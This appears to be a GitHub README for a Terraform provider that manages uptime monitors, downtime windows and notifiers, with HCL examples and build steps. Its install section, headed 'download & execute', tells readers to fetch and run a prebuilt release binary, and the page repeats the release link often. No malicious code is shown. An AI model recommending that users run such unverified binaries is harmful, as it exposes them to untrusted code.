# Terraform Provider for Uptime: Automate Website Monitoring

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/z-ainn/terraform-provider-uptime/releases)  [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)  ![Monitoring](https://images.unsplash.com/photo-1556157382-97eda2d62296?w=1200&q=80)

Control your Uptime Monitor account with Terraform. Manage monitors, downtime windows, notifiers, and alerts as code. Use Terraform to version, review, and reuse monitoring configs across teams and environments.

Table of contents
- Features
- Repository topics
- Quick start
- Requirements
- Install provider (download & execute)
- Configure provider
- Resources and data sources
- Example usage
- Importing existing monitors
- Tests and development
- CI / Releases
- Contributing
- License

Features
- Manage uptime monitors (HTTP, TCP, ping, keyword).
- Schedule planned downtime windows.
- Configure notifiers (email, webhook, SMS).
- Group monitors and apply shared notification rules.
- Apply immutable changes via Terraform plan and apply.
- Import existing monitors to HCL state.

Repository topics
api-monitoring, downtime, downtime-monitor, downtime-notifer, monitor, monitoring, monitoring-automation, monitoring-tool, terraform, terraform-module, terraform-modules, uptime, uptime-monitor, uptime-monitoring, website-monitoring

Quick start
- Install Terraform (v1.5+ recommended).
- Download the provider binary from the Releases page, extract, and place it in the Terraform plugins directory.
- Create a Terraform config with the provider block and at least one uptime_monitor resource.
- Run terraform init, plan, and apply.

Requirements
- Terraform 1.5 or later.
- Go 1.20+ (for building from source).
- An Uptime Monitor API token with full access.
- A system that runs the provider binary (Linux, macOS, Windows).

Install provider (download & execute)
The provider releases live on GitHub Releases. Download the appropriate release artifact from:
https://github.com/z-ainn/terraform-provider-uptime/releases

Because this link contains a path, download the correct file and execute or install it on your machine. Typical filenames:
- terraform-provider-uptime_vX.Y.Z_linux_amd64.tar.gz
- terraform-provider-uptime_vX.Y.Z_darwin_amd64.tar.gz
- terraform-provider-uptime_vX.Y.Z_windows_amd64.zip

Examples

Linux / macOS (bash)
```
# pick the version and platform file from the Releases page
curl -L -o terraform-provider-uptime_v1.0.0_linux_amd64.tar.gz \
  https://github.com/z-ainn/terraform-provider-uptime/releases/download/v1.0.0/terraform-provider-uptime_v1.0.0_linux_amd64.tar.gz

tar -xzf terraform-provider-uptime_v1.0.0_linux_amd64.tar.gz
chmod +x terraform-provider-uptime
mkdir -p ~/.terraform.d/plugins/github.com/z-ainn/uptime/1.0.0/linux_amd64
mv terraform-provider-uptime ~/.terraform.d/plugins/github.com/z-ainn/uptime/1.0.0/linux_amd64/terraform-provider-uptime
```

Windows (PowerShell)
```
# Download the zip file you choose from Releases
Invoke-WebRequest -Uri "https://github.com/z-ainn/terraform-provider-uptime/releases/download/v1.0.0/terraform-provider-uptime_v1.0.0_windows_amd64.zip" -OutFile provider.zip
Expand-Archive provider.zip -DestinationPath $env:USERPROFILE\.terraform.d\plugins\github.com\z-ainn\uptime\1.0.0\windows_amd64
```

If the Releases URL does not load or you need an alternate copy, check the project's Releases section on GitHub for available assets and instructions:
https://github.com/z-ainn/terraform-provider-uptime/releases

Configure provider
Create a minimal provider block in your Terraform code. The provider accepts an API token and optional base_url for custom Uptime-compatible services.

HCL example
```hcl
terraform {
  required_providers {
    uptime = {
      source  = "github.com/z-ainn/uptime"
      version = "1.0.0"
    }
  }
}

provider "uptime" {
  api_token = var.uptime_api_token
  # base_url = "https://api.custom-uptime.example"  # optional
  timeout   = 30
}
```

Variables example
```hcl
variable "uptime_api_token" {
  type      = string
  sensitive = true
}
```

Resources and data sources
This provider exposes primary resources to manage your monitoring stack.

Resources
- uptime_monitor
  - Creates an HTTP/TCP/ping/keyword monitor.
  - Attributes: name, url, type, interval, regions, tags, notify_when_down.
- uptime_downtime
  - Schedule a planned downtime window.
  - Attributes: start_time, end_time, monitors (list), recurrence (cron-like).
- uptime_notifier
  - Configure notification channels (email, webhook, SMS).
  - Attributes: type, address, webhook_url, headers.
- uptime_group
  - Group monitors to apply shared settings.
  - Attributes: name, monitor_ids.
- uptime_silence
  - Temporary silence for alerts on specific monitors.

Data sources
- uptime_monitor_list
  - Query existing monitors by tag or name.
- uptime_notifier_list
  - List configured notifiers.

Resource example — monitor
```hcl
resource "uptime_monitor" "example" {
  name       = "homepage"
  type       = "http"
  url        = "https://example.com/"
  interval   = 5
  regions    = ["us-east-1", "eu-west-1"]
  tags       = ["frontend", "production"]
  notify_when_down = true
  checks {
    follow_redirects = true
    expect_status     = 200
    match_body        = "Welcome"
  }
}
```

Resource example — planned downtime
```hcl
resource "uptime_downtime" "maintenance_weekend" {
  name      = "Weekly maintenance"
  start_time = "2025-09-06T02:00:00Z"
  end_time   = "2025-09-06T04:00:00Z"
  monitors   = [uptime_monitor.example.id]
  recurrence = "0 2 * * 6" # every Saturday at 02:00 UTC
}
```

Notifier example — webhook
```hcl
resource "uptime_notifier" "pager" {
  name       = "Ops Webhook"
  type       = "webhook"
  webhook_url = "https://hooks.example.com/uptime"
  headers = {
    "X-Api-Key" = var.webhook_key
  }
}
```

Importing existing monitors
You can import existing monitors into Terraform state using the monitor ID.

Example
```
terraform import uptime_monitor.example 12345
```

After import, run terraform plan to generate the HCL or compare current attributes and update the config.

Examples folder
Look in the examples/ directory for full HCL samples:
- examples/basic-monitor
- examples/downtime-and-notifiers
- examples/teams-and-roles

Development and testing
Build from source with Go. The repo uses Go modules and follows Terraform SDK v2 patterns.

Build the provider
```
git clone https://github.com/z-ainn/terraform-provider-uptime.git
cd terraform-provider-uptime
go build -o terraform-provider-uptime ./cmd/uptime
```

Run unit tests
```
go test ./... -v
```

Run acceptance tests
Set UPTIME_API_TOKEN environment variable and run:
```
export UPTIME_API_TOKEN="your-token"
go test ./acceptance -run TestAcc -v
```

Packaging releases
The repository includes a Makefile and goreleaser config. To produce a release artifact locally:
```
make build
goreleaser release --snapshot --rm-dist
```

CI / GitHub Actions
This project uses GitHub Actions for:
- go vet, go fmt, go test
- build for Linux, macOS, Windows
- pack release artifacts with semantic version tags
- publish GitHub Releases with signed assets

Releases
Visit the Releases page to download published binaries and checksums:
https://github.com/z-ainn/terraform-provider-uptime/releases

Download a release that matches your platform and follow the install steps above to place the provider in ~/.terraform.d/plugins or the project-level .terraform/plugins directory.

Versioning and compatibility
- The provider follows semantic versioning (MAJOR.MINOR.PATCH).
- Keep Terraform and provider versions compatible. Specify provider version in required_providers.
- When upgrading the provider, run terraform init -upgrade and validate the plan.

Operational notes
- The provider performs rate-limited API calls. It retries idempotent calls on transient failures.
- Use tags to group monitors and to target automation rules.
- Back up state files. Use remote state with locking (e.g., Terraform Cloud, S3 + DynamoDB).

Security
- Keep API tokens secret. Use environment variables or secret managers for CI.
- The provider supports custom base_url for self-hosted compatible services. Use TLS endpoints.

Contributing
- File issues for bugs and feature requests.
- Open pull requests against main branch. Follow the existing code style.
- Run go fmt and go vet before submitting a PR.
- Include unit tests for new features and update acceptance tests.

Maintainers
- Maintainer: z-ainn
- Link to releases and artifacts:
  https://github.com/z-ainn/terraform-provider-uptime/releases

License
This project uses the MIT license. See the LICENSE file for details.

Contact
Open issues on GitHub for questions, bugs, or feature requests. Use PRs for code changes and doc updates.

Screenshots and diagrams
![Monitor view](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=1200&q=80)
Diagram: store monitors as Terraform resources, schedule downtimes as managed resources, attach notifiers to the monitors by ID.

Common tasks
- Create a new monitor and attach a webhook notifier.
- Schedule a recurring weekly maintenance window for specific monitors.
- Import an existing set of monitors and re-create them as code.
- Create environment-specific monitor stacks (staging vs production) with different intervals and regions.

Changelog and releases
Check releases for binary downloads, changelogs, checksums, and install instructions:
https://github.com/z-ainn/terraform-provider-uptime/releases

License badge
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

Maintaining consistent state and repeatable monitoring as code improves reliability and auditability. Use the examples folder to adapt patterns to your team.